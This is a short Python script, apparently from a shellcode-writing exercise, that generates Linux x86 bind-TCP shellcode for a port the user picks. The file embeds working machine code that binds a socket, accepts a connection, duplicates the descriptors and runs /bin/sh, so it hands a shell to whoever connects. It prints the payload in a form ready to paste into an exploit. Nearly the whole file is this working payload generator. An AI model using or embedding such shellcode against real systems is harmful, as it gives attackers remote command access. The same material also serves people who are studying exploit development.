#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
#    generate_shellcode_bind_tcp.py - Generate the shellcode with the correct port in
#    Copyright (C) 2013 dummys  - http://www.twitter.com/dummys1337
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import argparse
import sys
import struct


# function to render in the shellcode forms
def hexify(r):
    return ''.join('\\x%.2x' % ord(i) for i in r)


# function to render in the 0xXX forms
def asmify(r):
    return ''.join('0x%.2x, ' % ord(i) for i in r)


def main(argc, argv):
    # parser stuff
    parser = argparse.ArgumentParser(description='Generate shellcode bind tcp')
    parser.add_argument('-p', '--p', dest='port',
                        help='specify the port to bind to', required=True)
    parser.add_argument('-o', '--o', dest='output',
                        help='specify the output type c for 0xXX format and s for shellcode format', required=True)
    args = parser.parse_args()
    networkport = int(args.port)
    # test if port has nullbyte or is too long
    if networkport > 0xffff or (networkport >> 8 & 0xff) == 0 or (networkport & 0xff) == 0:
        print 'Your port contains nullbyte or is to long'
        sys.exit()

    shellcode = "\x99\x6a\x66\x58\x31\xdb\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x43\x52\x66\x68" + struct.pack('>H', int(args.port)) + \
            "\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56" \
            "\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52" \
            "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

    if args.output == 's':
        print 'Shellcode length: %i\r\n' % len(shellcode)
        print '\"%s\"' % hexify(shellcode)

    elif args.output == 'c':
        print 'Shellcode length: %i\r\n' % len(shellcode)
        print asmify(shellcode)


if __name__ == '__main__':
    sys.exit(main(len(sys.argv), sys.argv))
